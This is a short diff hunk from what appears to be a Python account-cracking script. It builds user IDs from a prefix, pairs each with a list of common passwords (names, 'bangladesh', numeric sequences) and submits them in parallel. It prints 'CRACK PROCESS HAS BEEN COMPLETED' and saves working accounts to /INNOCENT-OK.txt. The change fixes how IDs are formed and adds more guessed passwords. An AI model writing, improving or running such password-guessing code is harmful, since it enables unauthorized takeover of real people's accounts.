@@ -208,8 +208,8 @@ def innocent():
         print('\033[1;92m [!] Use Flight Mode For Speed Up')
         linex()
         for fuck in user:
-            pwx = ['fuck','bangladesh','112244','223344','Bangladesh','lamiya','sadiya','00009999','258025','112255','112200','09876543','alamin','nazmul','lamiya']
-            uid = code+pwx
+            pwx = [fuck,'bangladesh','112244','223344','Bangladesh','lamiya','sadiya','00009999','258025','112255','112200','09876543','alamin','nazmul','lamiya','55443322','909090']
+            uid = code+fuck
             ahare.submit(mumitx,uid,pwx,tl)
     print('CRACK PROCESS HAS BEEN COMPLETED ')
     print('Ok Ids Saved in /INNOCENT-OK.txt')
